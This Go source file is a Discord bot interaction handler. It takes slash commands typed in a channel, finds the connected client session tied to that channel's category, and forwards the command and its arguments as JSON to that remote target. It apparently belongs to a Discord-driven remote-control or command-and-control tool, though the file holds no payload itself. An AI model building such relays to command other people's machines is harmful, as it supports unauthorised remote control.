package events

import (
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"go.uber.org/zap"
)

func (e *Event) OnInteractionCreate(session *discordgo.Session, event *discordgo.InteractionCreate) {
	switch event.Type {
	case discordgo.InteractionApplicationCommand:
		e.handleCommandInteraction(session, event)
	}
}

func (e *Event) handleCommandInteraction(dcSession *discordgo.Session, event *discordgo.InteractionCreate) {
	channel, err := dcSession.State.Channel(event.ChannelID)
	if err != nil {
		logger.L().Error("Failed to get channel", zap.Error(err))
		return
	}

	category, err := dcSession.State.Channel(channel.ParentID)
	if err != nil {
		logger.L().Error("Failed to get category", zap.Error(err))
		return
	}

	if category == nil {
		logger.L().Info("Command invoked outside a valid category", zap.String("channel", channel.Name))
		return
	}

	categoryName := category.Name
	existingSession, _ := e.Registry.Get(categoryName)

	if existingSession == nil {
		dcSession.InteractionRespond(event.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "It seems like the client is not connected. Please try again later.",
			},
		},
		)

		return
	}


	commandId := event.ID

	dcSession.InteractionRespond(event.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Your request has been received and is being processed.",
			Flags:   0,
			CustomID: commandId,
		},
	})

	

	data := event.ApplicationCommandData()
	arguments := data.Options

	var argumentValues []string
	for _, arg := range arguments {
		argumentValues = append(argumentValues, arg.StringValue())
	}

	command := types.Command{
		ID: 	 commandId,
		Name: 			data.Name,
		Args: 	argumentValues,
	}

	session := *existingSession

	e.Registry.StoreCommand(commandId, types.CommandData{
		ID: 			commandId,
		Timestamp: 	time.Now().Unix(),
		TargetID: session.GetSessionId(),
	})

	session.Send(types.MsgCommand, 0, 0, []byte(command.ToJSON()))
}
